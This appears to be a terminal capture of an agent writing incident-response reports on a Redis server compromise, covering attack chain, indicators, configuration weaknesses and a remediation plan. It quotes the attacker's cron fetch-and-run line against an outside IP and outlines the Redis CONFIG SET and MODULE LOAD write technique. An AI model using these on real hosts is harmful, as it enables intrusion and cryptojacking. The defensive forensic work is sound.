[?2004l[?2004h> # Post-Compromise Intrusion Forensic Report
[?2004l[?2004h> 
[?2004lt[?2004h> ## 1. Executive Summary
[?2004l[?2004h> On host `redis-prod-01`, an external threat actor exploited an unauthenticated Redis instance exposed to the public internet (`0.0.0.0:6379`). The threat actor used administrative Redis commands (`CONFIG SET` / module commands) to achieve remote execution as root, deploy a cryptocurrency miner, establish cron persistence, and install a silent userland rootkit via `LD_PRELOAD` dynamic linker hijacking.
[?2004l[?2004h> 
[?2004l[?2004h> While security alerts (`/sas/alerts.json:2`) captured the miner binary and the root cron modification, several critical persistence and stealth components were completely omitted from endpoint alerting and required forensic disk analysis (`/disk/etc/ld.so.preload:1`, `/disk/tmp/.redis/exp.so:1`, `/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Threat Actor Entities & Indicators of Compromise (IOCs)
[?2004l[?2004h> - **Originating Attacker IP**: `198.51.100.170` (`/sas/cti/advisory.txt:6`, `/disk/var/lib/.cache/.wiped.bin:1`, `/disk/var/spool/cron/crontabs/root:5`)
[?2004l[?2004h> - **Command and Control Domain (C2)**: `update-redis.example.cn` (`/sas/cti/advisory.txt:22`, `/disk/var/lib/.cache/.wiped.bin:1`)
[?2004l[?2004h> - **Cryptomining Pool**: `stratum+tcp://xmr.redis.evil:3333` (`/sas/cti/advisory.txt:23`, `/disk/tmp/.redis/kdevtmpfsi:2`, `/disk/tmp/.redis/exp.so:3`)
[?2004l[?2004h> - **Monero Wallet Address**: `4A00000000000000000031c7d95fb9f3` (`/sas/cti/advisory.txt:24`, `/disk/tmp/.redis/kdevtmpfsi:3`, `/disk/tmp/.redis/exp.so:4`)
[?2004l[?2004h> - **Payload Drop Location**: `/tmp/.redis/` (`/disk/tmp/.redis/kdevtmpfsi:1`, `/disk/tmp/.redis/exp.so:1`)
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Attack Chain & Technical Analysis
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1: Initial Access (ATT&CK T1133 - External Remote Services)
[?2004l[?2004h> The host ran Redis bound to all network interfaces (`0.0.0.0`) with `protected-mode` disabled and no password authentication configured (`/disk/etc/redis/redis.conf:3`). An external attacker connected directly to TCP port 6379 from IP `198.51.100.170` (`/sas/cti/advisory.txt:6`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2: Execution (ATT&CK T1059.004 - Unix Shell)
[?2004l[?2004h> The attacker utilized Redis `CONFIG SET` commands to write malicious files directly to the host filesystem, as well as staging exploit module binaries (`/disk/tmp/.redis/exp.so:1`, `/sas/cti/advisory.txt:13`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 3: Impact / Resource Hijacking (ATT&CK T1496 - Resource Hijacking)
[?2004l[?2004h> The attacker dropped and executed `kdevtmpfsi` (XMRig family miner process) under `/tmp/.redis/kdevtmpfsi` (`/disk/tmp/.redis/kdevtmpfsi:1`, `/sas/alerts.json:2`). The process connected to mining pool `stratum+tcp://xmr.redis.evil:3333` causing sustained high CPU consumption.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 4: Persistence (ATT&CK T1053.003 - Cron)
[?2004l[?2004h> Persistence was established by writing a root cron job into `/var/spool/cron/crontabs/root` (`/disk/var/spool/cron/crontabs/root:5`, `/sas/alerts.json:10`). The cron entry executes `curl hxxp://198.51.100.170/x | sh` to periodically re-download and maintain the mining payload.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 5: Evasion / Stealth (ATT&CK T1574.006 - Dynamic Linker Hijacking)
[?2004l[?2004h> To hide processes and avoid detection by system tools, the attacker modified `/etc/ld.so.preload` (`/disk/etc/ld.so.preload:1`) to preload `/lib/.hide.so`, a userland shared library rootkit. This mechanism was **silent** and not captured in `/sas/alerts.json`.
[?2004l[?2004h> 
[?2004l[?2004h> ## 4. Alerted vs. Silent Evidence Breakdown
[?2004l[?2004h> 
[?2004l[?2004h> | Artifact / Finding | File Path | ATT&CK Technique | Alert Feed Status | Evidence Citation |
[?2004l[?2004h> |-------------------|-----------|------------------|-------------------|-------------------|
[?2004l[?2004h> | Miner Process | `/tmp/.redis/kdevtmpfsi` | T1496 | Alerted (`ALERT-01`) | `/disk/tmp/.redis/kdevtmpfsi:1` / `/sas/alerts.json:2` |
[?2004l[?2004h> | Cron Persistence | `/var/spool/cron/crontabs/root` | T1053.003 | Alerted (`ALERT-02`) | `/disk/var/spool/cron/crontabs/root:5` / `/sas/alerts.json:10` |
[?2004l[?2004h> | Weak Redis Config | `/etc/redis/redis.conf` | T1133 | Alerted (`ALERT-03`) | `/disk/etc/redis/redis.conf:3` / `/sas/baseline.json:1` |
[?2004l[?2004h> | Dynamic Linker Preload Hook | `/etc/ld.so.preload` | T1574.006 | **SILENT** (Missed by SAS) | `/disk/etc/ld.so.preload:1` |
[?2004l[?2004h> | Staged Exploit / Module Sample | `/tmp/.redis/exp.so` | T1059.004 | **SILENT** (Missed by SAS) | `/disk/tmp/.redis/exp.so:1` |
[?2004l[?2004h> | Wiped Binary / Beacon Record | `/var/lib/.cache/.wiped.bin` | T1071.001 / T1070.004 | **SILENT** (Missed by SAS) | `/disk/var/lib/.cache/.wiped.bin:1` |
[?2004l[?2004h> 
[?2004l[?2004h> EOF
[?2004l[?2004hroot@43839b8f6af0:/app# cat << 'EOF' > /app/vuln-report.md
[?2004l[?2004h> # Vulnerability-Driven Entry Analysis Report
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Entry Vector Identification
[?2004l[?2004h> Detailed analysis of host evidence (`/disk/etc/redis/redis.conf:3`) and threat intelligence (`/sas/cti/advisory.txt:10`) confirms that the primary entry vector for host `redis-prod-01` was **not** a software memory corruption vulnerability or remote code execution CVE, but rather an **unauthenticated network service exposure and architectural misconfiguration**.
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Refutation of Erroneous CVE Claims
[?2004l[?2004h> Draft remediation documentation (`/sas/handoff/change-ticket.md:12`) incorrectly referenced **CVE-2019-0708 (BlueKeep)** targeting Remote Desktop Protocol (RDP).
[?2004l[?2004h> - Forensic examination confirms that host `redis-prod-01` is a Debian Linux machine (`/disk/etc/os-release:1`), which does not natively host Microsoft RDP or vulnerable Windows Remote Desktop Services.
[?2004l[?2004h> - Review of `/sas/vulns.json:1` shows zero vulnerability scan findings recorded by vulnerability scanners (`[]`).
[?2004l[?2004h> - CTI correlation (`/sas/cti/advisory.txt:10`) confirms the entry point was unauthenticated Redis access (MITRE ATT&CK T1133).
[?2004l[?2004h> - Therefore, no software patch for CVE-2019-0708 is applicable or required for this host.
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Technical Mechanism of Unauthenticated Redis Compromise
[?2004l[?2004h> 1. **Insecure Service Configuration** (`/disk/etc/redis/redis.conf:3`):
[?2004l[?2004h>    - `bind 0.0.0.0`: Exposed the Redis service to all available external and internal network interfaces.
[?2004l[?2004h>    - `protected-mode no`: Explicitly disabled default Redis protections that prevent unauthenticated external connections.
[?2004l[?2004h>    - `no password set`: Permitted unauthenticated clients full administrative control over the Redis service.
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Exploitation Sequence**:
[?2004l[?2004h>    - An external actor at IP `198.51.100.170` (`/sas/cti/advisory.txt:6`) connected to Redis on TCP port 6379.
[?2004l[?2004h>    - Using administrative commands (`CONFIG SET dir /var/spool/cron/crontabs` and `CONFIG SET dbfilename root`), the attacker manipulated Redis snapshot/dump functionality to write arbitrary crontab lines into system cron directories (`/disk/var/spool/cron/crontabs/root:5`).
[?2004l[?2004h>    - Alternatively or additionally, the attacker loaded custom shared modules using `MODULE LOAD` (`/disk/tmp/.redis/exp.so:1`) to execute shell commands directly under the privilege context of the Redis service daemon (root).
[?2004l[?2004h> 
[?2004l[?2004h> ## 4. Conclusion & Confidence Assessment
[?2004l[?2004h> - **Confidence Level**: **HIGH**
[?2004l[?2004h> - **Primary Evidence**: `/disk/etc/redis/redis.conf:3`, `/disk/var/spool/cron/crontabs/root:5`, `/disk/tmp/.redis/exp.so:1`, `/sas/cti/advisory.txt:10`.
[?2004l[?2004h> - **Summary**: Entry was achieved purely through misconfigured access controls on a sensitive service, not via software vulnerability exploitation.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@43839b8f6af0:/app# cat << 'EOF' > /app/baseline-report.md
[?2004l[?2004h> # Baseline and Configuration Weakness Report
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Overview
[?2004l[?2004h> A security baseline evaluation was conducted by comparing findings in `/sas/baseline.json:1` and system configurations in `/disk` against Debian 12 Linux hardening benchmarks and Redis security guidance.
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Identified Configuration Weaknesses
[?2004l[?2004h> 
[?2004l[?2004h> ### Baseline Weakness 1: Insecure Redis Service Exposure
[?2004l[?2004h> - **Evidence**: `/disk/etc/redis/redis.conf:3` (`Redis protected-mode no; bind 0.0.0.0; no password set`)
[?2004l[?2004h> - **Check Reference**: `CHK-05` (`/sas/baseline.json:2`)
[?2004l[?2004h> - **Defect Description**:
[?2004l[?2004h>   - `bind 0.0.0.0` allows connections on all network interfaces without firewall or interface restrictions.
[?2004l[?2004h>   - `protected-mode no` overrides Redis' built-in protection mechanism that rejects non-loopback queries when no password is set.
[?2004l[?2004h>   - `requirepass` is completely absent, granting unauthenticated administrative access to anyone reachable on port 6379.
[?2004l[?2004h> - **Risk Impact**: High. Direct execution of administrative commands (`CONFIG`, `MODULE LOAD`, `SAVE`) leading to root system compromise.
[?2004l[?2004h> 
[?2004l[?2004h> ### Baseline Weakness 2: Service Privilege Execution Context
[?2004l[?2004h> - **Evidence**: `/disk/var/spool/cron/crontabs/root:5` and `/disk/tmp/.redis/exp.so:1`
[?2004l[?2004h> - **Defect Description**: The Redis daemon was running under `root` privileges (or had elevated access allowing write access to system directories like `/var/spool/cron/crontabs/` and `/etc/ld.so.preload`).
[?2004l[?2004h> - **Risk Impact**: Critical. Allows arbitrary file writes directly to system configuration and cron directories.
[?2004l[?2004h> 
[?2004l[?2004h> ### Baseline Weakness 3: Dynamic Linker Preload Security Gap
[?2004l[?2004h> - **Evidence**: `/disk/etc/ld.so.preload:1`
[?2004l[?2004h> - **Defect Description**: System file permissions and integrity monitoring failed to prevent or detect modifications to `/etc/ld.so.preload` pointing to unauthorized libraries (`/lib/.hide.so`).
[?2004l[?2004h> - **Risk Impact**: High. Facilitates rootkit persistence and evasive process hiding.
[?2004l[?2004h> 
[?2004l[?2004h> ### Baseline Weakness 4: Absence of Network Boundary & Ingress Controls
[?2004l[?2004h> - **Evidence**: `/sas/cti/advisory.txt:6`, `/disk/var/lib/.cache/.wiped.bin:1`
[?2004l[?2004h> - **Defect Description**: Inbound network connections from untrusted public IP ranges (`198.51.100.170`) to management/database ports (6379) were not filtered at host firewall (`nftables`/`iptables`) or perimeter firewall levels.
[?2004l[?2004h> - **Risk Impact**: High. Allows direct external exposure of sensitive internal microservices.
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Remediation Baseline Requirements
[?2004l[?2004h> 1. Enforce strict `bind 127.0.0.1` or internal private IP binding in `/etc/redis/redis.conf`.
[?2004l[?2004h> 2. Re-enable `protected-mode yes`.
[?2004l[?2004h> 3. Configure strong authentication with `requirepass` or ACL user roles.
[?2004l[?2004h> 4. Rename or disable dangerous Redis commands (`CONFIG`, `MODULE`, `FLUSHALL`, `KEYS`).
[?2004l[?2004h> 5. Run Redis under a dedicated unprivileged user (`redis:redis`) with minimal filesystem permissions.
[?2004l[?2004h> 6. Deploy File Integrity Monitoring (FIM) on `/etc/ld.so.preload`, `/etc/crontab`, and cron directories.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@43839b8f6af0:/app# cat << 'EOF' > /app/remediation-plan.md
[?2004l[?2004h> # Prioritised Forensic Remediation Plan
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Principles & Rules
[?2004l[?2004h> - **Containment First**: Block external C2/attacker IPs immediately.
[?2004l[?2004h> - **Backup and Quarantine**: Per DFIR standards, backup and quarantine suspicious binaries, libraries, and crontabs before removal.
[?2004l[?2004h> - **Evidence-Driven**: Every step directly targets evidence identified under `/disk` or `/sas`.
[?2004l[?2004h> - **Non-Destructive Verification**: Test and verify host integrity post-remediation.
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Phase 1: Immediate Network Containment (Priority: Critical)
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 1.1: Block External Threat Actor IP
[?2004l[?2004h> - **Target**: IP `198.51.100.170`
[?2004l[?2004h> - **Evidence**: `/sas/cti/advisory.txt:6`, `/disk/var/lib/.cache/.wiped.bin:1`, `/disk/var/spool/cron/crontabs/root:5`
[?2004l[?2004h> - **Action**: Apply firewall drop rules at host and network perimeter firewalls.
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   iptables -I INPUT -s 198.51.100.170 -j DROP
[?2004l[?2004h>   iptables -I OUTPUT -d 198.51.100.170 -j DROP
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification**: `iptables -L -n -v | grep 198.51.100.170`
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Phase 2: Threat Eradication & Quarantine (Priority: High)
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2.1: Quarantine LD_PRELOAD Rootkit Hook
[?2004l[?2004h> - **Target**: `/etc/ld.so.preload` and referenced `/lib/.hide.so`
[?2004l[?2004h> - **Evidence**: `/disk/etc/ld.so.preload:1`
[?2004l[?2004h> - **Action**: Backup `/etc/ld.so.preload` to quarantine and clear/remove the file.
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   mkdir -p /var/quarantine/20260811_inc/
[?2004l[?2004h>   cp -a /etc/ld.so.preload /var/quarantine/20260811_inc/ld.so.preload.bak
[?2004l[?2004h>   [ -f /lib/.hide.so ] && cp -a /lib/.hide.so /var/quarantine/20260811_inc/hide.so.bak
[?2004l[?2004h>   rm -f /etc/ld.so.preload /lib/.hide.so
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification**: Verify `/etc/ld.so.preload` no longer exists and `ldd /bin/ls` exhibits standard library dependencies.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2.2: Terminate and Quarantine Cryptominer & Staged Modules
[?2004l[?2004h> - **Target**: `/tmp/.redis/` directory (`kdevtmpfsi`, `exp.so`)
[?2004l[?2004h> - **Evidence**: `/disk/tmp/.redis/kdevtmpfsi:1`, `/disk/tmp/.redis/exp.so:1`, `/sas/alerts.json:2`
[?2004l[?2004h> - **Action**: Terminate miner process PID 1337 (`kdevtmpfsi`), archive `/tmp/.redis/` to quarantine, and remove original files.
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   pkill -9 -f kdevtmpfsi || true
[?2004l[?2004h>   pkill -9 -f /tmp/.redis || true
[?2004l[?2004h>   tar -czf /var/quarantine/20260811_inc/tmp_redis_quarantine.tar.gz /tmp/.redis/
[?2004l[?2004h>   rm -rf /tmp/.redis/
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification**: `pgrep -f kdevtmpfsi` returns empty output; `ls -la /tmp/.redis` shows no file.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 2.3: Remove Malicious Cron Persistence
[?2004l[?2004h> - **Target**: `/var/spool/cron/crontabs/root`
[?2004l[?2004h> - **Evidence**: `/disk/var/spool/cron/crontabs/root:5`, `/sas/alerts.json:10`
[?2004l[?2004h> - **Action**: Backup root crontab, remove line 5 containing the malicious beacon script (`curl hxxp://198.51.100.170/x | sh`), and restore legitimate entries. M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K.
[?2004l[?2004h>   ```bash
[?2004l[?2004h>   cp -a /var/spool/cron/crontabs/root /var/quarantine/20260811_inc/root_crontab.bak
[?2004l[?2004h>   sed -i '/198\.51\.100\.170/d' /var/spool/cron/crontabs/root
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification**: `crontab -l -u root` no longer contains reference to IP `198.51.100.170` or `curl` payload.
[?2004l[?2004h> 
[?2004l[?2004h> ## 4. Phase 3: System Hardening & Vulnerability Remediation (Priority: High)
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 3.1: Secure Redis Service Configuration
[?2004l[?2004h> - **Target**: `/etc/redis/redis.conf`
[?2004l[?2004h> - **Evidence**: `/disk/etc/redis/redis.conf:3`, `/sas/baseline.json:2`
[?2004l[?2004h> - **Action**: Update Redis settings to enforce authentication, restrict interface binding, and enable protected-mode.
[?2004l[?2004h>   ```bash population
[?2004l[?2004h>   cp -a /etc/redis/redis.conf /var/quarantine/20260811_inc/redis.conf.bak
[?2004l[?2004h>   sed -i 's/bind 0.0.0.0/bind 127.0.0.1/' /etc/redis/redis.conf
[?2004l[?2004h>   sed -i 's/protected-mode no/protected-mode yes/' /etc/redis/redis.conf
[?2004l[?2004h>   echo "requirepass <STRONG_GENERATED_AUTHENTICATION_PASSWORD>" >> /etc/redis/redis.conf
[?2004l[?2004h>   echo "rename-command CONFIG \"\"" >> /etc/redis/redis.conf
[?2004l[?2004h>   echo "rename-command MODULE \"\"" >> /etc/redis/redis.conf
[?2004l[?2004h>   systemctl restart redis
[?2004l[?2004h>   ```
[?2004l[?2004h> - **Verification**: `redis-cli ping` returns `NOAUTH Authentication required.` Connections from non-loopback IPs are rejected.
[?2004l[?2004h> 
[?2004l[?2004h> ### Step 3.2: Restrict Service Account Privileges
[?2004l[?2004h> - **Action**: Ensure Redis service runs under dedicated unprivileged account `redis:redis` with `NoNewPrivileges=true` in systemd unit configuration.
[?2004l[?2004h> 
[?2004l[?2004h> ## 5. Phase 4: Monitoring & Post-Remediation Verification (Priority: Medium)
[?2004l[?2004h> 1. Audit active processes with `ps aux` to ensure no orphaned processes or high CPU miner threads persist.
[?2004l[?2004h> 2. Review `/var/log/auth.log` and `/var/log/syslog` for unauthorized connection attempts.
[?2004l[?2004h> 3. Deploy File Integrity Monitoring (e.g. Auditd or Samhain) monitoring `/etc/ld.so.preload`, `/etc/cron*`, and `/var/spool/cron/`.
[?2004l[?2004h> EOF
